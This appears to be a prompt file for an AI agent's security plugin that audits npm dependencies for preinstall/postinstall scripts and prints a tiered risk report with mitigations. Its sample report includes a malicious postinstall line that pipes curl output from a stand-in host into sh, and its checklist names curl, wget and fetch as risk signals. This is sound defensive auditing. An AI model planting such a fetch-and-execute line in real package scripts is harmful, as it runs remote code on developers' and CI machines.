---
description: Audit every npm package (direct and transitive) for postinstall/preinstall scripts — the primary supply-chain attack vector in the npm ecosystem.
argument-hint: "[path] [--transitive] [--json]"
---

Identify all npm packages that run arbitrary shell commands at install time via `preinstall`, `install`, `postinstall`, or `prepare` lifecycle hooks. These scripts execute with full filesystem and network access the moment anyone runs `npm install`, making them the most direct supply-chain attack surface in the npm ecosystem.

```bash
node ${CLAUDE_PLUGIN_ROOT}/scanner/dist/agentic-security.mjs banner 2>/dev/null || true
PATH_ARG="."
INCLUDE_TRANSITIVE=false
JSON_OUT=false

for arg in "$@"; do
  case "$arg" in
    --transitive) INCLUDE_TRANSITIVE=true ;;
    --json)       JSON_OUT=true ;;
    -*) ;;
    *) PATH_ARG="$arg" ;;
  esac
done
```

After parsing args, perform the audit:

1. **Collect packages to audit:**
   - Always include direct `dependencies` from every `package.json` found under `PATH_ARG` (excluding `node_modules/`).
   - If `--transitive` is passed: also include every package listed in `node_modules/.package-lock.json` or `node_modules/*/package.json`.
   - If `node_modules/` is absent, fall back to reading `package-lock.json` `packages` section to get the full dep list.

2. **For each package**, read its `package.json` from `node_modules/<name>/package.json` and check the `scripts` field for any of:
   - `preinstall` — runs before `npm install` extracts the package
   - `install` — runs during installation
   - `postinstall` — runs after installation (most common attack vector)
   - `prepare` — runs on `npm install` and `npm publish` for local packages
   - `prepack` / `postpack` — runs during `npm pack` / publish

3. **For each package with install scripts**, collect:
   - Package name, version, script name, full script content
   - Whether it is a direct or transitive dependency
   - Whether `node_modules/<name>/` contains a native binary (`.node` file) — legitimate reason for postinstall
   - Whether the script calls known-safe operations: `node-pre-gyp`, `node-gyp`, `prebuild-install`, `cmake-js` — these compile native addons and are generally expected
   - Whether the script makes network calls (`curl`, `wget`, `fetch`, `http`) — elevated risk
   - Whether the script is obfuscated or minified — high risk
   - Whether the package has a known CVE in `last-scan.json`

4. **Assign a risk tier to each finding:**
   - `HIGH` — transitive dep with network calls in script, or script is obfuscated/minified, or has known CVE
   - `MEDIUM` — direct dep with non-native-build postinstall (unexpected for the package's stated purpose)
   - `LOW` — well-known packages with expected native build scripts (e.g., `node-sass`, `sharp`, `canvas`, `bcrypt`)
   - `INFO` — `prepare` scripts in your own workspace packages (normal for monorepos)

5. **Print the report:**

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  agentic-security: install-script-audit
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Audited: 42 direct · 387 transitive packages
  Packages with install scripts: 6

  HIGH RISK (2)
  ──────────────────────────────────────────────
  ⛔  fancy-package @ 2.1.0  [transitive via your-dep]
      postinstall: "node ./scripts/setup.js"
      ⚠  Script makes outbound HTTP request (downloads binary at runtime)
      ⚠  Package has 0 GitHub stars, published 3 weeks ago
      Action: replace your-dep, or add to .npmrc: ignore-scripts=true
              and verify the binary is not required for functionality.

  ⛔  build-helper @ 1.0.3   [direct · has CVE-2024-XXXX]
      postinstall: "bash -c 'curl -s https://example.com/s|sh'"
      ⚠  Downloads and executes remote shell script
      ⚠  Package flagged with CVE-2024-XXXX (malicious postinstall)
      Action: npm uninstall build-helper immediately.

  MEDIUM RISK (1)
  ──────────────────────────────────────────────
  ⚠   some-utility @ 3.4.1   [direct]
      postinstall: "node postinstall.js"
      Script writes a config file to ~/.somerc. Not a native build.
      Action: Review postinstall.js. If not needed, add to .npmrc:
              ignore-scripts=true or use --ignore-scripts on install.

  LOW RISK / EXPECTED (3)
  ──────────────────────────────────────────────
  ✓   sharp @ 0.32.1          [direct]  postinstall: node-pre-gyp install (native image processing)
  ✓   bcrypt @ 5.1.0          [direct]  postinstall: node-pre-gyp install (native crypto)
  ✓   canvas @ 2.11.2         [direct]  postinstall: node-gyp rebuild    (native canvas bindings)

  ──────────────────────────────────────────────
  MITIGATIONS
  ──────────────────────────────────────────────

  Block all install scripts globally (breaks native builds — verify first):
    npm config set ignore-scripts true

  Block scripts only for CI (recommended):
    # In .npmrc:
    ignore-scripts=true
    # Then allowlist specific packages that need native builds:
    //registry.npmjs.org/sharp:ignore-scripts=false

  Per-install override:
    npm install --ignore-scripts

  Use a policy file (npm 8+):
    Add "overrides" or use Socket.dev / Snyk for allow/deny script policies.
```

6. After the report, print a **"Why this matters"** paragraph: explain that postinstall scripts run with the same privileges as the developer's shell, have full filesystem and network access, and are the mechanism used in real supply-chain attacks (event-stream 2018, node-ipc 2022, xz-utils 2024 analog). A single compromised transitive dep can exfiltrate credentials from the developer's machine or CI environment.

7. If `--json` is passed: emit a JSON array of findings instead of the formatted report, with fields `{ package, version, depth, script_name, script_content, risk, reason, action }`.

8. If no install scripts are found:
```
✅  No install-time scripts found across N packages.
    Your npm install does not execute any third-party shell code.
```

🛡  agentic-security · created by ClearCapabilities.Com
